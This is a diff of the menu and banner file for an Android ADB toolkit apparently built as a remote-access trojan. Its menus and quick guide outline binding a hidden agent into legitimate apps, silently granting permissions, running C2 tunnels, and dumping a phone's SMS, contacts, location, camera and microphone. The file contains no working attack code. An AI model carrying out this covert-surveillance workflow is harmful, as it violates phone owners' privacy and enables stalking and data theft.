@@ -1,43 +1,94 @@
-"""
-    COPYRIGHT DISCLAIMER
+# Andro-DLS — Banner & Menu System
+# Copyright (c) 2025–2026 Khurshid Jhon & Dls-geek Team
 
-    Script : Andro-DLS - All in One Android Hacking ADB Toolkit
+version = "v3.0.0"
 
-    Copyright (C) 2026  Khurshid Jhon (github.com/Dls-geek)
-
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    (at your option) any later version.
-
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
-
-    You should have received a copy of the GNU General Public License
-    along with this program.  If not, see <https://www.gnu.org/licenses/>.
-"""
-
-version = "v2.1.1"
-
+# ─── Main Menu (Page 0) ───────────────────────────────────────────────────
 menu1 = """
-    [bold yellow]── DLS-GEEK · PHONE CONTROL ─────────────────────────────────[/bold yellow]
+    [bold yellow]── ANDRO-DLS · PHONE CONTROL ───────────────────────────────────[/bold yellow]
 
-    [white]1.[/white] [green]▸ AUTO CONNECT[/green]      [dim]USB → Wi-Fi bridge → payload → saved forever[/dim]
-    [white]2.[/white] [green]▸ RECONNECT[/green]        [dim]saved phone → live shell + pentest options[/dim]
-    [white]3.[/white] [green]▸ PORTMAP SETUP[/green]    [dim]permanent internet tunnel (one-time)[/dim]
+    [white]1.[/white] [green]▸ USB SETUP[/green]              [dim]cable connect → tcpip 5555 → wireless[/dim]
+    [white]2.[/white] [green]▸ CONNECTED DEVICES[/green]     [dim]see all · reconnect · manage[/dim]
+    [white]3.[/white] [green]▸ BUILD AGENT[/green]           [dim]pure / enhanced / trojan bind[/dim]
 
     [dim]0. Exit          keeper: tunnel+listener 24/7 in background[/dim]
 """
 
-_focused = "\n  [dim](focused build — legacy tools removed)[/dim]\n"
-menu2 = _focused
-menu3 = _focused
-menu4 = _focused
-menu5 = _focused
+# ─── Connected Devices (Page 1) ────────────────────────────────────────────
+menu2 = """
+    [bold cyan]── CONNECTED DEVICES ───────────────────────────────────────────[/bold cyan]
 
-menu = [menu1, menu2, menu3, menu4, menu5]
+    [white]1.[/white] [green]▸ LIST ALL DEVICES[/green]       [dim]USB + WiFi + saved[/dim]
+    [white]2.[/white] [green]▸ CONNECT TO DEVICE[/green]     [dim]pick device → connect[/dim]
+    [white]3.[/white] [green]▸ RECONNECT LAST[/green]        [dim]quick reconnect to last device[/dim]
+    [white]4.[/white] [green]▸ DEVICE INFO[/green]           [dim]model, Android ver, IP, battery[/dim]
+    [white]5.[/white] [green]▸ PULL APKs[/green]             [dim]extract all installed apps[/dim]
+    [white]6.[/white] [green]▸ GRANT PERMISSIONS[/green]     [dim]silent grant all runtime perms[/dim]
+
+    [dim]99. Back to Main Menu[/dim]
+"""
+
+# ─── Build Agent (Page 2) ──────────────────────────────────────────────────
+menu3 = """
+    [bold magenta]── BUILD AGENT ───────────────────────────────────────────────[/bold magenta]
+
+    [white]1.[/white] [green]▸ PURE BUILD[/green]            [dim]no msfvenom · most stealthy[/dim]
+    [white]2.[/white] [green]▸ ENHANCED BUILD[/green]        [dim]msfvenom base + 6-layer injection[/dim]
+    [white]3.[/white] [green]▸ TROJAN BIND[/green]           [dim]inject agent into legit APK[/dim]
+    [white]4.[/white] [green]▸ WORK PROFILE DEPLOY[/green]   [dim]hidden profile · cross-resurrection[/dim]
+    [white]5.[/white] [green]▸ DEPLOY TO DEVICE[/green]      [dim]install + grant perms + launch[/dim]
+
+    [dim]99. Back to Main Menu[/dim]
+"""
+
+# ─── C2 & Tunnel (Page 3) ─────────────────────────────────────────────────
+menu4 = """
+    [bold red]── C2 & TUNNEL ─────────────────────────────────────────────────[/bold red]
+
+    [white]1.[/white] [green]▸ START KEEPER[/green]          [dim]24/7 listener + tunnel[/dim]
+    [white]2.[/white] [green]▸ CLOUDFLARE TUNNEL[/green]     [dim]international routing · no port fwd[/dim]
+    [white]3.[/white] [green]▸ PORTMAP TUNNEL[/green]        [dim]legacy portmap.io tunnel[/dim]
+    [white]4.[/white] [green]▸ KEEPER STATUS[/green]         [dim]check sessions + connections[/dim]
+
+    [dim]99. Back to Main Menu[/dim]
+"""
+
+# ─── Data Access (Page 4) ──────────────────────────────────────────────────
+menu5 = """
+    [bold blue]── DATA ACCESS ─────────────────────────────────────────────────[/bold blue]
+
+    [white]1.[/white] [green]▸ SCREENSHOT[/green]            [dim]capture screen[/dim]
+    [white]2.[/white] [green]▸ SCREEN RECORD[/green]         [dim]record screen[/dim]
+    [white]3.[/white] [green]▸ SMS DUMP[/green]              [dim]read all SMS messages[/dim]
+    [white]4.[/white] [green]▸ CONTACTS DUMP[/green]         [dim]read all contacts[/dim]
+    [white]5.[/white] [green]▸ CALL LOGS[/green]             [dim]read call history[/dim]
+    [white]6.[/white] [green]▸ LOCATION[/green]              [dim]get GPS location[/dim]
+    [white]7.[/white] [green]▸ CAMERA[/green]                [dim]launch camera / live view[/dim]
+    [white]8.[/white] [green]▸ MICROPHONE[/green]            [dim]record audio[/dim]
+    [white]9.[/white] [green]▸ FILE BROWSER[/green]          [dim]browse /sdcard/ · pull files[/dim]
+    [white]10.[/white] [green]▸ APP LIST[/green]             [dim]list all installed apps[/dim]
+    [white]11.[/white] [green]▸ SYSTEM INFO[/green]          [dim]device info · battery · network[/dim]
+    [white]12.[/white] [green]▸ SEND SMS[/green]             [dim]send SMS from device[/dim]
+    [white]13.[/white] [green]▸ OPEN URL[/green]             [dim]open URL on device[/dim]
+
+    [dim]99. Back to Main Menu[/dim]
+"""
+
+# ─── Shell Access (Page 5) ─────────────────────────────────────────────────
+menu6 = """
+    [bold green]── SHELL ACCESS ────────────────────────────────────────────────[/bold green]
+
+    [white]1.[/white] [green]▸ INTERACTIVE SHELL[/green]     [dim]direct shell on device[/dim]
+    [white]2.[/white] [green]▸ KEEPER SHELL[/green]          [dim]shell via C2 tunnel[/dim]
+    [white]3.[/white] [green]▸ RUN COMMAND[/green]           [dim]one-shot command[/dim]
+    [white]4.[/white] [green]▸ MIRROR SCREEN[/green]         [dim]scrcpy live mirror + control[/dim]
+
+    [dim]99. Back to Main Menu[/dim]
+"""
+
+menu = [menu1, menu2, menu3, menu4, menu5, menu6]
+
+# ─── Banners ───────────────────────────────────────────────────────────────
 
 banner2 = """
         ░█▀▀█ █──█ █▀▀█ █▀▀▄ █▀▀ ░█▀▀▀█ █▀▀█ █── █▀▀█ ─▀─ ▀▀█▀▀ 　 ░█▀▀█ █▀▀█ █▀▀█
@@ -70,23 +121,12 @@ banner4 = """
 
 banner5 = """
        ___  __                 ____     __     _ __     ___
-      / _ \\/ /  ___  ___  ___ / __/__  / /__  (_) /_   / _ \\_______ 
+      / _ \\/ /  ___  ___  ___ / __/__  / /__  (_) /_   / _ \\_______
      / ___/ _ \\/ _ \\/ _ \\/ -_)\\ \\/ _ \\/ / _ \\/ / __/  / ___/ __/ _ \\
     /_/  /_//_/\\___/_//_/\\__/___/ .__/_/\\___/_/\\__/  /_/  /_/  \\___/
                                /_/
 
         [red]{version}[/red]        [white]By Khurshid Jhon & Dls-geek Team[/white]
-""".format(version=version)
-
-banner6 = """
-        ____  __                    _____       __      _ __       ____
-       / __ \\/ /_  ____  ____  ___ / ___/____  / /___  (_) /_     / __ \\___________
-      / /_/ / __ \\/ __ \\/ __ \\/ _ \\\\__ \\/ __ \\/ / __ \\/ / __/    / /_/ / ___/ __ \\
-     / ____/ / / / /_/ / / / /  __/__/ / /_/ / / /_/ / / /_     / ____/ /  / /_/ /
-    /_/   /_/ /_/\\____/_/ /_/\\___/____/ .___/_/\\____/_/\\__/    /_/   /_/   \\____/
-                                     /_/
-
-           [red]{version}[/red]               [white]By github.com/Dls-geek[/white]
 """.format(version=version)
 
 banner10 = """
@@ -103,60 +143,35 @@ banner10 = """
             [red]{version}[/red]                                [white]By Khurshid Jhon & Dls-geek Team[/white]
 """.format(version=version)
 
-banner11 = """
-    _____________                   ________       ______     __________       ________
-    ___  __ \\__  /_____________________  ___/__________  /________(_)_  /_      ___  __ \\____________
-    __  /_/ /_  __ \\  __ \\_  __ \\  _ \\____ \\___  __ \\_  /_  __ \\_  /_  __/      __  /_/ /_  ___/  __ \\
-    _  ____/_  / / / /_/ /  / / /  __/___/ /__  /_/ /  / / /_/ /  / / /_        _  ____/_  /   / /_/ /
-    /_/     /_/ /_/\\____//_/ /_/\\___//____/ _  .___//_/  \\____//_/  \\__/        /_/     /_/    \\____/
-                                            /_/
+banner_list = [banner2, banner3, banner4, banner5, banner10]
 
-
-            [red]{version}[/red]                            [white]By Khurshid Jhon & Dls-geek Team[/white]
-""".format(version=version)
-
-banner12 = """
-        ▒█▀▀█ █░░█ █▀▀█ █▀▀▄ █▀▀ ▒█▀▀▀█ █▀▀█ █░░ █▀▀█ ░▀░ ▀▀█▀▀ 　 ▒█▀▀█ █▀▀█ █▀▀█
-        ▒█▄▄█ █▀▀█ █░░█ █░░█ █▀▀ ░▀▀▀▄▄ █░░█ █░░ █░░█ ▀█▀ ░░█░░ 　 ▒█▄▄█ █▄▄▀ █░░█
-        ▒█░░░ ▀░░▀ ▀▀▀▀ ▀░░▀ ▀▀▀ ▒█▄▄▄█ █▀▀▀ ▀▀▀ ▀▀▀▀ ▀▀▀ ░░▀░░ 　 ▒█░░░ ▀░▀▀ ▀▀▀▀
-
-
-            [red]{version}[/red]                            [white]By Khurshid Jhon & Dls-geek Team[/white]
-""".format(version=version)
-
-banner_list = [
-    banner2,
-    banner3,
-    banner4,
-    banner5,
-    banner6,
-    banner10,
-    banner11,
-    banner12,
-]
+# ─── Instructions ──────────────────────────────────────────────────────────
 
 instructions_banner = """[cyan]
-        ____           __                  __  _
-       /  _/___  _____/ /________  _______/ /(_)___  ____  _____
-       / // __ \\/ ___/ __/ ___/ / / / ___/ __/ / __ \\/ __ \\/ ___/
-     _/ // / / (__  ) /_/ /  / /_/ / /__/ /_/ / /_/ / / / (__  )
-    /___/_/ /_/____/\\__/_/   \\__,_/\\___/\\__/_/\\____/_/ /_/____/
+        ╔══════════════════════════════════════════════════════════╗
+        ║              ANDRO-DLS · QUICK GUIDE                    ║
+        ╠══════════════════════════════════════════════════════════╣
+        ║  Step 1: USB SETUP (Option 1)                          ║
+        ║    → Connect phone via USB cable                       ║
+        ║    → Enable USB debugging on phone                     ║
+        ║    → Tool switches phone to wireless ADB               ║
+        ║    → Remove cable — everything works over WiFi now     ║
+        ║                                                        ║
+        ║  Step 2: CONNECTED DEVICES (Option 2)                  ║
+        ║    → See all connected devices                         ║
+        ║    → Pick device → connect                             ║
+        ║    → Pull APKs, grant permissions, manage              ║
+        ║                                                        ║
+        ║  Step 3: BUILD AGENT (Option 3)                        ║
+        ║    → Pure / Enhanced / Trojan Bind                     ║
+        ║    → Deploy to device → agent runs hidden              ║
+        ║                                                        ║
+        ║  Step 4: C2 & TUNNEL (after deploy)                    ║
+        ║    → Start keeper → Cloudflare tunnel                  ║
+        ║    → Agent connects → full control from anywhere       ║
+        ║                                                        ║
+        ║  Step 5: DATA ACCESS                                   ║
+        ║    → Screenshots, SMS, contacts, camera, mic, location ║
+        ║    → All over C2 tunnel — any network, any country     ║
+        ╚══════════════════════════════════════════════════════════╝
 [/cyan]"""
-
-hacking_banner = """[green]
-    █░█ ▄▀█ █▀▀ █▄▀ █ █▄░█ █▀▀ ░ ░ ░
-    █▀█ █▀█ █▄▄ █░█ █ █░▀█ █▄█ ▄ ▄ ▄
-[/green]"""
-
-keycode_menu = """
-    [white]1. [green]Keyboard Text Input                [white]11. [green]Enter
-    [white]2. [green]Home                               [white]12. [green]Volume Up
-    [white]3. [green]Back                               [white]13. [green]Volume Down
-    [white]4. [green]Recent Apps                        [white]14. [green]Media Play
-    [white]5. [green]Power Button                       [white]15. [green]Media Pause
-    [white]6. [green]DPAD Up                            [white]16. [green]Tab
-    [white]7. [green]DPAD Down                          [white]17. [green]Esc
-    [white]8. [green]DPAD Left
-    [white]9. [green]DPAD Right
-   [white]10. [green]Delete/Backspace[/green]
-"""
